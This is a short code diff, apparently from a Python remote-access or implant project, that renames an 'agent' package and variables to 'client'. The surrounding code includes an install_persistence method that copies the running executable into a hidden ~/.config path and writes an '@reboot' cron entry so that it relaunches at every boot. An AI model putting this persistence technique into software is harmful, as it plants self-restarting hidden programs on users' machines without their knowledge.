@@ -3,7 +3,7 @@ import subprocess
 import shutil
 import sys
 
-from agent.platform.base import AbstractPlatform
+from client.platform.base import AbstractPlatform
 
 
 class LinuxPlatform(AbstractPlatform):
@@ -39,9 +39,9 @@ class LinuxPlatform(AbstractPlatform):
 
     def install_persistence(self, reg_name, copy_name):
         try:
-            agent_path = os.path.expanduser(f'~/.config/{copy_name}')
-            if not os.path.exists(agent_path):
-                shutil.copyfile(sys.executable, agent_path)
+            client_path = os.path.expanduser(f'~/.config/{copy_name}')
+            if not os.path.exists(client_path):
+                shutil.copyfile(sys.executable, client_path)
             cron_line = f'@reboot {sys.executable} ~/.config/{copy_name}\n'
             cron_path = os.path.expanduser('~/.config/crontab_entry')
             with open(cron_path, 'w') as f:
